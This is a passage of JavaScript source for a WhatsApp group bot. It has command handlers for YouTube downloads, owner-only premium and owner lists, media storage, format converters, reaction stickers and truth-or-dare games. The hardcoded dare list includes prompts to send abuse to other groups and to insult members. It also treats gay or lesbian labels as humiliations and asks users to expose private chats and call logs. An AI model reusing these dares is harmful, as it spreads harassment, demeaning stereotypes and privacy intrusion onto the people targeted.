                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                }
                client.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case '/xxxxplay':{
if (!text) return replygcZero(`Example : ${prefixo+command} story wa anime`)
ZeroStickWait()
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
client.sendMessage(from, { image : eek, caption: ngen }, { quoted: m})
}
break
case '/play':  case '/song': {
if (!text) return replygcZero(`Example : ${prefixo + command} anime whatsapp status`)
const Zeroplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await Zeroplaymp3.mp3(anup3k.url)
await client.sendMessage(from,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "/ytmp3": case "/ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
const Zeroaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Zeroaudp3.isYTUrl(text)) return replygcZero(`Where's the yt link?\nExample: ${prefixo + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await Zeroaudp3.mp3(text)
await client.sendMessage(from,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case '/ytmp4': case '/ytvideo': {
const Zerovidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !Zerovidoh.isYTUrl(text)) replygcZero(`Where is the link??\n\nExample : ${prefixo + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await Zerovidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await client.sendMessage(from,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case '/ytvxxx': case '/ytmp4xxx': case '/mp4xxx':{
if (!text) return replygcZero('Enter the link!!!')
ZeroStickWait()
downloadMp4(text)
}
break
case '/ytaxxx': case '/ytmp3xxx': case '/mp3xxx':{
if (!text) return replygcZero('Enter the link!!!')
ZeroStickWait()
downloadMp3(text)
}
break  
case '/getcase':
if (!ZeroTheCreator) return ZeroStickOwner()
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("ZeroCheems7.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcZero(`${getCase(q)}`)
break
case '/addprem':
if (!ZeroTheCreator) return ZeroStickOwner()
if (!args[0]) return replygcZero(`Use ${prefixo+command} number\nExample ${prefixo+command} 917404854406`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcZero(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcZero(`The Number ${prrkek} Has Been Premium!`)
break
case '/delprem':
if (!ZeroTheCreator) return ZeroStickOwner()
if (!args[0]) return replygcZero(`Use ${prefixo+command} nomor\nExample ${prefixo+command} 917404854406`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcZero(`The Number ${ya} Has Been Removed Premium!`)
break
case '/addbadword':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Whats the word?')
if (BadZero.includes(q)) return replygcZero("The word is already in use")
BadZero.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadZero))
replygcZero(`Success Adding Bad Word\nCheck by typing ${prefixo}listbadword`)
}
break
case '/delbadword':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Enter the word')
if (!BadZero.includes(q)) return replygcZero("The word does not exist in the database")
let wanu = BadZero.indexOf(q)
BadZero.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadZero))
replygcZero(`Success deleting bad word ${q}`)
}
break
case '/listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadZero) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadZero.length}*`
replygcZero(teks)
}
break
case '/addvideo':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Whats the video name?')
if (VideoZero.includes(q)) return replygcZero("The name is already in use")
let delb = await client.downloadAndSaveMediaMessage(quoted)
VideoZero.push(q)
await fsx.copy(delb, `./Media/video/${q}.mp4`)
fs.writeFileSync('./Media/database/Zerovideo.json', JSON.stringify(VideoZero))
fs.unlinkSync(delb)
replygcZero(`Success Adding Video\nCheck by typing ${prefixo}listvideo`)
}
break
case '/delvideo':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Enter the video name')
if (!VideoZero.includes(q)) return replygcZero("The name does not exist in the database")
let wanu = VideoZero.indexOf(q)
VideoZero.splice(wanu, 1)
fs.writeFileSync('./Media/database/Zerovideo.json', JSON.stringify(VideoZero))
fs.unlinkSync(`./Media/video/${q}.mp4`)
replygcZero(`Success deleting video ${q}`)
}
break
case '/listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoZero) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoZero.length}*`
replygcZero(teks)
}
break
case '/addimage':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Whats the image name?')
if (ImageZero.includes(q)) return replygcZero("The name is already in use")
let delb = await client.downloadAndSaveMediaMessage(quoted)
ImageZero.push(q)
await fsx.copy(delb, `./Media/image/${q}.jpg`)
fs.writeFileSync('./Media/database/Zeroimage.json', JSON.stringify(ImageZero))
fs.unlinkSync(delb)
replygcZero(`Success Adding Image\nCheck by typing ${prefixo}listimage`)
}
break
case '/delimage':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Enter the image name')
if (!ImageZero.includes(q)) return replygcZero("The name does not exist in the database")
let wanu = ImageZero.indexOf(q)
ImageZero.splice(wanu, 1)
fs.writeFileSync('./Media/database/Zeroimage.json', JSON.stringify(ImageZero))
fs.unlinkSync(`./Media/image/${q}.jpg`)
replygcZero(`Success deleting image ${q}`)
}
break
case '/listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageZero) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageZero.length}*`
replygcZero(teks)
}
break
case '/addsticker':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Whats the sticker name?')
if (StickerZero.includes(q)) return replygcZero("The name is already in use")
let delb = await client.downloadAndSaveMediaMessage(quoted)
StickerZero.push(q)
await fsx.copy(delb, `./Media/sticker/${q}.webp`)
fs.writeFileSync('./Media/database/Zerosticker.json', JSON.stringify(StickerZero))
fs.unlinkSync(delb)
replygcZero(`Success Adding Sticker\nCheck by typing ${prefixo}liststicker`)
}
break
case '/delsticker':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Enter the sticker name')
if (!StickerZero.includes(q)) return replygcZero("The name does not exist in the database")
let wanu = StickerZero.indexOf(q)
StickerZero.splice(wanu, 1)
fs.writeFileSync('./Media/database/Zerosticker.json', JSON.stringify(StickerZero))
fs.unlinkSync(`./Media/sticker/${q}.webp`)
replygcZero(`Success deleting sticker ${q}`)
}
break
case '/liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerZero) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerZero.length}*`
replygcZero(teks)
}
break
case '/addvn':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Whats the audio name?')
if (VoiceNoteZero.includes(q)) return replygcZero("The name is already in use")
let delb = await client.downloadAndSaveMediaMessage(quoted)
VoiceNoteZero.push(q)
await fsx.copy(delb, `./Media/audio/${q}.mp3`)
fs.writeFileSync('./Media/database/Zerovn.json', JSON.stringify(VoiceNoteZero))
fs.unlinkSync(delb)
replygcZero(`Success Adding Audio\nCheck by typing ${prefixo}listvn`)
}
break
case '/delvn':{
if (!ZeroTheCreator) return ZeroStickOwner()
if (args.length < 1) return replygcZero('Enter the vn name')
if (!VoiceNoteZero.includes(q)) return replygcZero("The name does not exist in the database")
let wanu = VoiceNoteZero.indexOf(q)
VoiceNoteZero.splice(wanu, 1)
fs.writeFileSync('./Media/database/Zerovn.json', JSON.stringify(VoiceNoteZero))
fs.unlinkSync(`./Media/audio/${q}.mp3`)
replygcZero(`Success deleting vn ${q}`)
}
break
case '/listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteZero) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteZero.length}*`
replygcZero(teks)
}
break
case '/addowner':
if (!ZeroTheCreator) return ZeroStickOwner()
if (!args[0]) return replygcZero(`Use ${prefixo+command} number\nExample ${prefixo+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await client.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcZero(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcZero(`Number ${bnnd} Has Become An Owner!!!`)
break
case '/delowner':
if (!ZeroTheCreator) return ZeroStickOwner()
if (!args[0]) return replygcZero(`Use ${prefixo+command} nomor\nExample ${prefixo+command} 917404854406`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcZero(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case '/listpremium': case '/listprem':
teks = '*Premium List*\n\n'
for (let client of prem) {
teks += `- ${client}\n`
}
teks += `\n*Total : ${prem.length}*`
client.sendMessage(from, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case '/setcmd': {
                if (!m.quoted) return replygcZero('Reply Message!')
                if (!m.quoted.fileSha256) return replygcZero('SHA256 Hash Missing')
                if (!text) return replygcZero(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcZero('You have no permission to change this sticker command')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcZero(`Done!`)
            }
            break
case '/delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcZero(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcZero('You have no permission to delete this sticker command')             
                delete global.db.sticker[hash]
                replygcZero(`Done!`)
            }
            break
case '/listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                client.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case '/lockcmd': {
                if (!isCreator) return ZeroStickOwner()
                if (!m.quoted) return replygcZero('Reply Message!')
                if (!m.quoted.fileSha256) return replygcZero('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcZero('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcZero('Done!')
            }
            break
case '/addmsg': {
                if (!m.quoted) return replygcZero('Reply Message You Want To Save In Database')
                if (!text) return replygcZero(`Example : ${prefixo + command} filename`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygcZero(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcZero(`Successfully added message in message list as '${text}'
    
Access with ${prefixo}getmsg ${text}

View list of Messages With ${prefixo}listmsg`)
            }
            break
case '/getmsg': {
                if (!text) return replygcZero(`Example : ${prefixo + command} file name\n\nView list of messages with ${prefixo}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygcZero(`'${text}' not listed in the message list`)
                client.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case '/listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcZero(teks)
	    }
	    break
	case '/delmsg': case '/deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcZero(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcZero(`Successfully deleted '${text}' from the message list`)
            }
	    break
case '/setexif': {
               if (!ZeroTheCreator) return ZeroStickOwner()
               if (!text) return replygcZero(`Example : ${prefixo + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcZero(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case '/getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await client.fetchStatus(who)
    replygcZero(bio.status)
  } catch {
    if (text) return replygcZero(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await client.fetchStatus(who)
      replygcZero(bio.status)
    } catch {
      return replygcZero(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case '/setppbot': case '/setbotpp': {
if (!ZeroTheCreator) return ZeroStickOwner()
if (!quoted) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
if (!/image/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
if (/webp/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
var medis = await client.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await client.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcZero(`Success`)
} else {
var memeg = await client.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcZero(`Success`)
}
}
break
case '/creategc': case '/creategroup': {
if (!ZeroTheCreator) return ZeroStickOwner()
if (!args.join(" ")) return replygcZero(`Use ${prefixo+command} groupname`)
try {
let cret = await client.groupCreate(args.join(" "), [])
let response = await client.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
client.sendMessage(from, { text:teks, mentions: await client.parseMention(teks)}, {quoted:m})
} catch {
replygcZero("Error!")
}
}
break
case '/cry': case '/kill': case '/hug': case '/pat': case '/lick': 
case '/kiss': case '/bite': case '/yeet': case '/bully': case '/bonk':
case '/wink': case '/poke': case '/nom': case '/slap': case '/smile': 
case '/wave': case '/awoo': case '/blush': case '/smug': case '/glomp': 
case '/happy': case '/dance': case '/cringe': case '/cuddle': case '/highfive': 
case '/shinobu': case '/handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
client.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case '/woof':
case '/8ball':
case '/goose':
case '/gecg':
case '/feed':
case '/avatar':
case '/fox_girl':
case '/lizard':
case '/spank':
case '/meow':
case '/tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
client.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case '/tomp4': case '/tovideo': {
                if (!quoted) return replygcZero('Reply to Sticker')
                if (!/webp/.test(mime)) return replygcZero(`reply sticker with caption *${prefixo + command}*`)
                ZeroStickWait()
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await client.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await client.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case '/toaud': case '/toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefixo + command}`)
            if (!quoted) return replygcZero(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefixo + command}`)
            ZeroStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            client.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case '/tomp3': {
            if (/document/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefixo + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefixo + command}`)
            if (!quoted) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefixo + command}`)
            ZeroStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            client.sendMessage(from, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${client.user.name}.mp3`}, { quoted : m })
            }
            break
            case '/tovn': case '/toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Reply Video/Audio That You Want To Be VN With Caption ${prefixo + command}`)
            if (!quoted) return replygcZero(`Reply Video/Audio That You Want To Be VN With Caption ${prefixo + command}`)
            ZeroStickWait()
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            client.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case '/togif': {
                if (!quoted) return replygcZero('Reply video')
                if (!/webp/.test(mime)) return replygcZero(`reply sticker with caption *${prefixo + command}*`)
                ZeroStickWait()
		let { webp2mp4File } = require('./lib/uploader')
                let media = await client.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await client.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case '/toqr':{
  if (!q) return replygcZero(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await client.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case '/dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner Zero through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const Zerodare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              client.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ Zerodare }, {quoted:m})
              break
                            break
       case '/truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, Zero?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const Zerotruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              client.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Zerotruth }, {quoted:m})
              break
case '/checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
